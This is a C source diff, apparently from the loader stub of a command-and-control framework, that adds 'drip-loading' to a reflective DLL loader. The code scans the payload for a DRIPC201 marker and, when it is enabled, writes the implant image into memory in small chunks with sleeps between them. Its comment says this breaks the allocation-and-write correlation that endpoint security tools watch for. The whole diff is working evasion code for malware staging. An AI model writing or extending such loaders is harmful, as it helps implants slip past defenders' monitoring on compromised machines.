@@ -112,12 +112,39 @@ void bw_entry(void)
 	if (flat == NULL)
 		bw_die(7);
 	/* volatile: a plain byte copy folds into a memcpy call, and this
-	 * template links CRT-free (kernel32 only) */
+	 * template links CRT-free (kernel32 only).
+	 *
+	 * C-56 stage drip-loading (4.12 rdll_use_driploading): the TS patches
+	 * enable+delay into the DRIPC201 marker carried in the appended DLL;
+	 * when enabled, write the flat image in 0x1000-byte drizzles with
+	 * delay-ms sleeps - breaking the alloc->write event correlation
+	 * (xuanxuan0/DripLoader technique). Disabled = plain copy. */
 	{
 		volatile unsigned char *d = (volatile unsigned char *)flat;
 		unsigned char *src2 = pe;
-		for (i = 0; i < (DWORD)len; i++)
-			d[i] = src2[i];
+		DWORD drip_ms = 0, k;
+		for (k = 0; k + 16 <= len; k += 4) {
+			if (*(DWORD *)(src2 + k) == 0x50495244UL /* "DRIP" */
+			    && *(DWORD *)(src2 + k + 4) == 0x31303243UL /* "C201" */
+			    && *(DWORD *)(src2 + k + 8) != 0) {
+				drip_ms = *(DWORD *)(src2 + k + 12);
+				break;
+			}
+		}
+		if (drip_ms) {
+			DWORD done = 0;
+			while (done < (DWORD)len) {
+				DWORD n = (len - done > 0x1000) ? 0x1000 : (len - done);
+				for (i = 0; i < n; i++)
+					d[done + i] = src2[done + i];
+				done += n;
+				if (done < (DWORD)len)
+					Sleep(drip_ms);
+			}
+		} else {
+			for (i = 0; i < (DWORD)len; i++)
+				d[i] = src2[i];
+		}
 	}
 
 	/* walk the DLL exports for ReflectiveLoader (RVA->raw translated) */
